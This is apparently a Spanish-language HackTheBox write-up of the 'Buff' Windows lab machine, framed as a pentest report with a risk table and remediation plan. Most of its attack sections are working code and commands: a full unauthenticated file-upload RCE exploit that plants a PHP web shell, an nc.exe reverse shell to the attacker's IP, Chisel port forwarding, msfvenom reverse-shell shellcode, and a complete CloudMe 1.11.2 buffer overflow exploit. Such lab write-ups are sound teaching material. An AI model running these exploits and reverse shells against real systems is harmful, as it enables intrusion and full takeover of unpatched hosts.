---
title: "HTB - Buff"
project: "Buff Corp"
platform: "Windows 10 Pro x86"
os: "Windows 10 Pro (Build 17763)"
tags:
  - Windows
  - Apache
  - PHP
  - FileUpload
  - RCE
  - BufferOverflow
  - PortForwarding
  - Chisel
  - HTB
hashtags:
  - "#Windows"
  - "#Apache"
  - "#PHP"
  - "#FileUpload"
  - "#RCE"
  - "#BufferOverflow"
  - "#PortForwarding"
  - "#Chisel"
  - "#HTB"
image:
  path: /assets/img/posts/htb/buff/banner.png
  alt: "Buff - Máquina HTB Windows"
toc: true
toc_label: "📑 Contenido"
toc_sticky: true
---

## Resumen Ejecutivo

Se realizó un compromiso exitoso contra la máquina **Buff** de HackTheBox, un sistema **Windows 10 Pro (x86)** que expone los puertos **8080 (Apache/PHP)** y **7680 (desconocido)**.

El vector de entrada fue la enumeración web que reveló **Gym Management System 1.0**, un software con una vulnerabilidad crítica de **subida de archivos sin autenticación** que permite RCE. La explotación consistió en subir un archivo PHP malicioso con doble extensión (`kaio-ken.php.png`) burlando las validaciones del sistema, estableciendo una web shell que permitió ejecutar comandos.

La escalada de privilegios se logró mediante **Buffer Overflow** en **CloudMe 1.11.2**, un servicio que escuchaba en `localhost:8888`. Utilizando **Chisel** para port forwarding, se ejecutó el exploit desde la máquina atacante, obteniendo una shell como `NT AUTHORITY\SYSTEM`.

### Riesgos Identificados

|Riesgo|Impacto|Probabilidad|Severidad|
|---|---|---|---|
|Formulario `/upload.php` sin autenticación|Crítico|Confirmado|🔴 CRÍTICO|
|Validación de extensiones vulnerable (doble extensión)|Crítico|Confirmado|🔴 CRÍTICO|
|Directorio `/upload/` público y ejecutable|Crítico|Confirmado|🔴 CRÍTICO|
|Servicio CloudMe 1.11.2 vulnerable a Buffer Overflow|Crítico|Confirmado|🔴 CRÍTICO|
|Puerto 8888 accesible desde localhost sin restricciones|Alto|Confirmado|🟠 ALTO|

### Plan de Remediación

1. **Inmediato:** Implementar autenticación en `/upload.php`; solo usuarios autorizados.
    
2. **Inmediato:** Validar extensiones de archivo correctamente; no permitir dobles extensiones.
    
3. **Inmediato:** Deshabilitar ejecución de PHP en el directorio `/upload/`.
    
4. **Corto plazo:** Actualizar CloudMe a la última versión (parche CVE-2020-37070).
    
5. **Mediano plazo:** Restringir servicios que escuchan en localhost a puertos no críticos.
    
6. **Largo plazo:** Implementar WAF para detectar subida de archivos maliciosos.
    

---

## Machine Info

|Clave|Valor|
|---|---|
|**Nombre**|Buff|
|**IP**|`10.129.15.7`|
|**OS**|Windows 10 Pro (x86, Build 17763)|
|**Servidor Web**|Apache 2.4.43 / PHP 7.4.6|
|**Skills**|Web Enum, File Upload RCE, Port Forwarding, Buffer Overflow, Windows Privilege Escalation|
|**Fecha**|2026-06-15|

---

## Reconocimiento (Reconnaissance)

### Target Scoping

- **IP Objetivo:** `10.129.15.7`
    
- **Sistema:** Windows 10 Pro (x86) con Apache/PHP
    
- **Vector Principal:** Aplicación web en puerto 8080
    

### 📡 Escaneo de Puertos

#### Escaneo Inicial
```bash
nmap -p7680,8080 -sCV -Pn $(target) -oN allServices.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-14 16:19 +0200
Nmap scan report for 10.129.15.7
Host is up (0.20s latency).
```
#### Resutlados:
```
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
```

|Puerto|Servicio|Versión|Notas|
|---|---|---|---|
|8080/tcp|HTTP|Apache 2.4.43 / PHP 7.4.6|Servidor web principal|
|7680/tcp|Desconocido|-|No relevante para el ataque|

## Enumeración Web

### Fuzzing de Directorios

```bash

gobuster dir -u http://10.129.15.7:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x php,txt -H "User-Agent: Mozilla/5.0"
```

**Resultados clave:**

```bash

/images               (Status: 301) [--> http://10.129.15.7:8080/images/]
/css                  (Status: 301) [--> http://10.129.15.7:8080/css/]
/js                   (Status: 301) [--> http://10.129.15.7:8080/js/]
/fonts                (Status: 301) [--> http://10.129.15.7:8080/fonts/]
/index.php            (Status: 200)
/contact.php          (Status: 200)  # 🎯 Pista del software
/about.php            (Status: 200)
/services.php         (Status: 200)
/team.php             (Status: 200)
/classes              (Status: 301)
/db.php               (Status: 500)  # 🎯 Interesante
/config.php           (Status: 500)
/upload.php           (Status: 200)  # 🎯 VECTOR DE ATAQUE
```

### Identificación del Software

```bash

curl -s http://10.129.15.7:8080/contact.php | grep -i "powered by"
```

**Resultado:**

```bash
Powered by <a href="https://www.sourcecodester.com/php/14468/gym-management-system-using-php-and-mysql.html">Gym Management Software 1.0</a>
```

**Conclusión:** El servidor web ejecuta **Gym Management System 1.0**, vulnerable a **RCE por subida de archivos sin autenticación**.

## Explotación (Exploitation)

### 1. RCE en Gym Management System 1.0
**Vulnerabilidades Explotadas:**

1. **Autenticación**: `/upload.php` no verifica sesión de usuario
    
2. **Extensión**: Bypass mediante doble extensión (`kaio-ken.php.png`)
    
3. **Content-Type**: Bypass del tipo MIME con `image/png`
    
4. **Código Malicioso**: Inyección de PHP en el contenido del archivo
    

#### Script de Explotación (48506.py)
Este es el script que da vulnerabilidad al manager gym 1.0 y se puede ver que carga el archivo kamehameha.php con la variable telepathy donde se obtiene un RCE
```bash

# Exploit Title: Gym Management System 1.0 - Unauthenticated Remote Code Execution
# Exploit Author: Bobby Cooke
# Date: 2020-05-21
# Vendor Homepage: https://projectworlds.in/
# Software Link: https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/
# Version: 1.0
# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4
# Exploit Tested Using: Python 2.7.17
# Vulnerability Description:
#   Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.
# Exploit Details:
#   1. Access the '/upload.php' page, as it does not check for an authenticated user session.
#   2. Set the 'id' parameter of the GET request to the desired file name for the uploaded PHP file.
#     - `upload.php?id=kamehameha`
#     /upload.php:
#        4 $user = $_GET['id'];
#       34       move_uploaded_file($_FILES["file"]["tmp_name"],
#       35       "upload/". $user.".".$ext);
#   3. Bypass the extension whitelist by adding a double extension, with the last one as an acceptable extension (png).
#     /upload.php:
#        5 $allowedExts = array("jpg", "jpeg", "gif", "png","JPG");
#        6 $extension = @end(explode(".", $_FILES["file"]["name"]));
#       14 && in_array($extension, $allowedExts))
#   4. Bypass the file type check by modifying the 'Content-Type' of the 'file' parameter to 'image/png' in the POST request, and set the 'pupload' paramter to 'upload'.
#        7 if(isset($_POST['pupload'])){
#        8 if ((($_FILES["file"]["type"] == "image/gif")
#       11 || ($_FILES["file"]["type"] == "image/png")
#   5. In the body of the 'file' parameter of the POST request, insert the malicious PHP code:
#       <?php echo shell_exec($_GET["telepathy"]); ?>
#   6. The Web Application will rename the file to have the extension with the second item in an array created from the file name; seperated by the '.' character.
#       30           $pic=$_FILES["file"]["name"];
#       31             $conv=explode(".",$pic);
#       32             $ext=$conv['1'];
#   - Our uploaded file name was 'kaio-ken.php.png'. Therefor $conv['0']='kaio-ken'; $conv['1']='php'; $conv['2']='png';
#   7. Communicate with the webshell at '/upload.php?id=kamehameha' using GET Requests with the telepathy parameter.

import requests, sys, urllib, re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL+'upload/kamehameha.php'
        getdir  = {'telepathy': 'echo %CD%'}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL
            r2.raise_for_status()
        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            thought = raw_input(term)
            command = {'telepathy': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def header():
    BL   = Style.BRIGHT+Fore.GREEN
    RS   = Style.RESET_ALL
    FR   = Fore.RESET
    SIG  = BL+'            /\\\n'+RS
    SIG += Fore.YELLOW+'/vvvvvvvvvvvv '+BL+'\\'+FR+'--------------------------------------,\n'
    SIG += Fore.YELLOW+'`^^^^^^^^^^^^'+BL+' /'+FR+'============'+Fore.RED+'BOKU'+FR+'====================="\n'
    SIG += BL+'            \/'+RS+'\n'
    return SIG

if __name__ == "__main__":
    print header();
    if len(sys.argv) != 2:
        print formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0])
        print formatHelp("(+) Example:\t python %s 'https://10.0.0.3:443/gym/'" % sys.argv[0])
        sys.exit(-1)
    SERVER_URL = sys.argv[1]
    UPLOAD_DIR = 'upload.php?id=kamehameha'
    UPLOAD_URL = SERVER_URL + UPLOAD_DIR
    s = requests.Session()
    s.get(SERVER_URL, verify=False)
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png     = {
                'file':
                  (
                    'kaio-ken.php.png',
                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["telepathy"]); ?>',
                    'image/png',
                    {'Content-Disposition': 'form-data'}
                  )
              }
    fdata   = {'pupload': 'upload'}
    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
    webshell(SERVER_URL, s)


```
**Ejecución:**

```bash

python2 48506.py http://10.129.15.7:8080/
```

**Resultado:** Web shell funcional en:

```text

http://10.129.15.7:8080/upload/kamehameha.php?telepathy=<COMANDO>
http://10.129.15.7:8080/upload/kamehameha.php?telepathy=whoami
```

Me monto un server con 
```bash
# desde kali
impacket-smbserver share $(pwd) -smb2support

#desde navegador con RCE:
view-source:http://10.129.15.7:8080/upload/kamehameha.php?telepathy=dir%20%5c%5c10.10.14.26%5cshare%5c
view-source:http://10.129.15.7:8080/upload/kamehameha.php?telepathy=dir%20\\10.10.14.26\share\
```
una vez que tenemos conectividad (antes tambien verificar un tcpdump para recibir el ping)
podemos ponernos a descar el nc64.exe para obtener una conexcion mas estable y con movimiento lateral. 

#### Verificación del RCE

```bash

http://10.129.15.7:8080/upload/kamehameha.php?telepathy=whoami
```

**Salida:**


```
nt authority\iusr
```


### Obteniendo shell interactiva en el sistema
```bash
# en kali
rlwrap nc -nvlp 4444 

# en la URL con RCE
\\10.10.14.26\share\nc.exe -e cmd.exe 10.10.14.26 4444
# Comando url encoded
%5c%5c10.10.14.26%5cshare%5cnc.exe%20-e%20cmd.exe%2010.10.14.26%204444
```
![Access](/assets/img/posts/htb/buff/Pasted image 20260615130108.png)

### Ejecutando winPEAS
```bash
# En la kali una vez copiado el winpeas en la carpeta local ejecutamos el server impacket
impacket-smbserver share $(pwd) -smb2support

# Desde la mquina victima
copy \\10.10.14.26\share\winPEASany.exe
```

### Post-Explotacion
luego de pasar el winpeas y varios falsos positivos despues se encontro un arhcivo `CouldMe.exe` en download , el mismo sistema cuenta con este programa en ejecucion por el puerto `8888` y encontramos un exploit para el **buffer over flow** pero el script no se logra ejecutar en consola, es necesario realizar un **port forwarding** a mi maquina

#### Chisel
Descargar el chisel desde el repositorio
```bash

[chisel_1.11.5_linux_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz)
mv chisel_1.11.5_linux_am64.gz chisel
gunzip chisel
chmod +x chisel

# Desde Kali (server)
chisel server --reverse -p 1234
```

#### Chisel windows
Desde la maquina windows se debe descargar la opcion de windows
y transferirlo usando el impacket-smb antes usado
```bash
#En mi kali (carpeta con el chise_windows.exe)
(https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_windows_amd64.zip)
uznip chisel_1.11.5_windows_amd64.zip
ls --> chisel_windows.exe
```

```bash
#Kali
impacket-smbserver share $(pwd) -smb2support
```

```bash
# En la maquina windows
copy \\10.10.14.26\share\chisel_windows.exe .

chisel.exe client 10.10.14.26:1234 R:8888:127.0.0.1:8888
```


##  4. Escalada de Privilegios - Buffer Overflow

### 4.1 Port Forwarding con Chisel

#### Preparación en Kali

```bash

# Descargar Chisel Linux
wget https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz
gunzip chisel_1.11.5_linux_amd64.gz
mv chisel_1.11.5_linux_amd64 chisel
chmod +x chisel
# Descargar Chisel Windows
wget https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_windows_amd64.zip
unzip chisel_1.11.5_windows_amd64.zip
# Genera chisel_1.11.5_windows_amd64.exe
```

#### Configuración del Túnel

**En Kali (Servidor):**

```bash

./chisel server --reverse -p 1234
```

**Salida:**

```bash

server: Reverse tunnelling enabled
server: Fingerprint txS32u4IUxA9GA5sgNs+iQ7HOdWhbaZzJffPkxDBYeg=
server: Listening on http://0.0.0.0:1234
```

**Transferencia a la víctima:**

```bash

copy \\10.10.14.26\share\chisel_windows.exe .
```

**En la víctima (Cliente):**

```cmd

chisel_windows.exe client 10.10.14.26:1234 R:8888:127.0.0.1:8888
```

**Salida:**

```bash

client: Connecting to ws://10.10.14.26:1234
client: Connected (Latency 30ms)
```

### 4.2 Generación del Payload
#### Generando payload para el buffer

```bash

msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.26 LPORT=4445 -b '\x00\x0a\x0d' -f python -v payload
```

**msfvenom** para hacer el payload
```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.26 LPORT=4445 -b '\x00\x0a\x0d' -f python -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1899 bytes
payload =  b""
payload += b"\xdd\xc7\xd9\x74\x24\xf4\xb8\x33\xa7\xb0\xe5"
payload += b"\x5f\x31\xc9\xb1\x52\x31\x47\x17\x03\x47\x17"
payload += b"\x83\xf4\xa3\x52\x10\x06\x43\x10\xdb\xf6\x94"
payload += b"\x75\x55\x13\xa5\xb5\x01\x50\x96\x05\x41\x34"
payload += b"\x1b\xed\x07\xac\xa8\x83\x8f\xc3\x19\x29\xf6"
payload += b"\xea\x9a\x02\xca\x6d\x19\x59\x1f\x4d\x20\x92"
payload += b"\x52\x8c\x65\xcf\x9f\xdc\x3e\x9b\x32\xf0\x4b"
payload += b"\xd1\x8e\x7b\x07\xf7\x96\x98\xd0\xf6\xb7\x0f"
payload += b"\x6a\xa1\x17\xae\xbf\xd9\x11\xa8\xdc\xe4\xe8"
payload += b"\x43\x16\x92\xea\x85\x66\x5b\x40\xe8\x46\xae"
payload += b"\x98\x2d\x60\x51\xef\x47\x92\xec\xe8\x9c\xe8"
payload += b"\x2a\x7c\x06\x4a\xb8\x26\xe2\x6a\x6d\xb0\x61"
payload += b"\x60\xda\xb6\x2d\x65\xdd\x1b\x46\x91\x56\x9a"
payload += b"\x88\x13\x2c\xb9\x0c\x7f\xf6\xa0\x15\x25\x59"
payload += b"\xdc\x45\x86\x06\x78\x0e\x2b\x52\xf1\x4d\x24"
payload += b"\x97\x38\x6d\xb4\xbf\x4b\x1e\x86\x60\xe0\x88"
payload += b"\xaa\xe9\x2e\x4f\xcc\xc3\x97\xdf\x33\xec\xe7"
payload += b"\xf6\xf7\xb8\xb7\x60\xd1\xc0\x53\x70\xde\x14"
payload += b"\xf3\x20\x70\xc7\xb4\x90\x30\xb7\x5c\xfa\xbe"
payload += b"\xe8\x7d\x05\x15\x81\x14\xfc\xfe\xa4\xe2\xf0"
payload += b"\xe4\xd0\xf0\x0c\x08\x7c\x7c\xea\x40\x6e\x28"
payload += b"\xa5\xfc\x17\x71\x3d\x9c\xd8\xaf\x38\x9e\x53"
payload += b"\x5c\xbd\x51\x94\x29\xad\x06\x54\x64\x8f\x81"
payload += b"\x6b\x52\xa7\x4e\xf9\x39\x37\x18\xe2\x95\x60"
payload += b"\x4d\xd4\xef\xe4\x63\x4f\x46\x1a\x7e\x09\xa1"
payload += b"\x9e\xa5\xea\x2c\x1f\x2b\x56\x0b\x0f\xf5\x57"
payload += b"\x17\x7b\xa9\x01\xc1\xd5\x0f\xf8\xa3\x8f\xd9"
payload += b"\x57\x6a\x47\x9f\x9b\xad\x11\xa0\xf1\x5b\xfd"
payload += b"\x11\xac\x1d\x02\x9d\x38\xaa\x7b\xc3\xd8\x55"
payload += b"\x56\x47\xd5\xce\xc7\xd0\x8e\xa8\x62\x9d\xd2"
payload += b"\x4a\x59\xe2\xea\xc8\x6b\x9b\x08\xd0\x1e\x9e"
payload += b"\x55\x56\xf3\xd2\xc6\x33\xf3\x41\xe6\x11"
```

otro payload des test 
```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.26 LPORT=4445 -b '\x00\x0a\x0d' -f c EXITFUNC=thread

# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.26 LPORT=4445 -b '\x00\x0a\x0d' -f python -v payload
shellcode = (b"\xd9\xca\xba\xb0\xee\x1b\xda\xd9\x74\x24\xf4\x58\x29\xc9"
b"\xb1\x52\x31\x50\x17\x03\x50\x17\x83\x70\xea\xf9\x2f\x8c"
b"\x1b\x7f\xcf\x6c\xdc\xe0\x59\x89\xed\x20\x3d\xda\x5e\x91"
b"\x35\x8e\x52\x5a\x1b\x3a\xe0\x2e\xb4\x4d\x41\x84\xe2\x60"
b"\x52\xb5\xd7\xe3\xd0\xc4\x0b\xc3\xe9\x06\x5e\x02\x2d\x7a"
b"\x93\x56\xe6\xf0\x06\x46\x83\x4d\x9b\xed\xdf\x40\x9b\x12"
b"\x97\x63\x8a\x85\xa3\x3d\x0c\x24\x67\x36\x05\x3e\x64\x73"
b"\xdf\xb5\x5e\x0f\xde\x1f\xaf\xf0\x4d\x5e\x1f\x03\x8f\xa7"
b"\x98\xfc\xfa\xd1\xda\x81\xfc\x26\xa0\x5d\x88\xbc\x02\x15"
b"\x2a\x18\xb2\xfa\xad\xeb\xb8\xb7\xba\xb3\xdc\x46\x6e\xc8"
b"\xd9\xc3\x91\x1e\x68\x97\xb5\xba\x30\x43\xd7\x9b\x9c\x22"
b"\xe8\xfb\x7e\x9a\x4c\x70\x92\xcf\xfc\xdb\xfb\x3c\xcd\xe3"
b"\xfb\x2a\x46\x90\xc9\xf5\xfc\x3e\x62\x7d\xdb\xb9\x85\x54"
b"\x9b\x55\x78\x57\xdc\x7c\xbf\x03\x8c\x16\x16\x2c\x47\xe6"
b"\x97\xf9\xc8\xb6\x37\x52\xa9\x66\xf8\x02\x41\x6c\xf7\x7d"
b"\x71\x8f\xdd\x15\x18\x6a\xb6\x13\xd7\x7a\x5c\x4c\xe5\x82"
b"\x71\xd1\x60\x64\x1b\xf9\x24\x3f\xb4\x60\x6d\xcb\x25\x6c"
b"\xbb\xb6\x66\xe6\x48\x47\x28\x0f\x24\x5b\xdd\xff\x73\x01"
b"\x48\xff\xa9\x2d\x16\x92\x35\xad\x51\x8f\xe1\xfa\x36\x61"
b"\xf8\x6e\xab\xd8\x52\x8c\x36\xbc\x9d\x14\xed\x7d\x23\x95"
b"\x60\x39\x07\x85\xbc\xc2\x03\xf1\x10\x95\xdd\xaf\xd6\x4f"
b"\xac\x19\x81\x3c\x66\xcd\x54\x0f\xb9\x8b\x58\x5a\x4f\x73"
b"\xe8\x33\x16\x8c\xc5\xd3\x9e\xf5\x3b\x44\x60\x2c\xf8\x1f"
b"\x45\xff\x0f\x77\xdc\x6a\x52\x15\xdf\x41\x91\x20\x5c\x63"
b"\x6a\xd7\x7c\x06\x6f\x93\x3a\xfb\x1d\x8c\xae\xfb\xb2\xad"
b"\xfa")


overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + shellcode))

buf = padding1 + EIP + NOPS + shellcode + overrun

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
	print("Exploit enviado:" .format(target))
except Exception as e:
	print(sys.exc_value)
	print("Error:")
	sys.exit(1)


```

**Explicación del Buffer Overflow:**

|Componente|Tamaño|Función|
|---|---|---|
|`padding1`|1052 bytes|Rellena el buffer hasta el EIP|
|`eip`|4 bytes|`0x68A842B5` (PUSH ESP, RET)|
|`nops`|30 bytes|NOP sled (espacio para el shellcode)|
|`shellcode`|351 bytes|Reverse shell a 10.10.14.26:4445|
|`overrun`|Variable|Relleno final para alcanzar 1500 bytes|

### 4.4 Ejecución del Exploit

**Preparar listener en Kali:**

```bash

nc -lvnp 4445
```

**Ejecutar exploit en Kali:**

```bash

python3 cloudme_exploit.py
```

**Salida en el listener:**

```bash

listening on [any] 4445 ...
connect to [10.10.14.26] from (UNKNOWN) [10.129.15.7] 49178
Microsoft Windows [Version 10.0.17763.1697]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami
nt authority\system
```
![Root](/assets/img/posts/htb/buff/Pasted image 20260616122038.png)
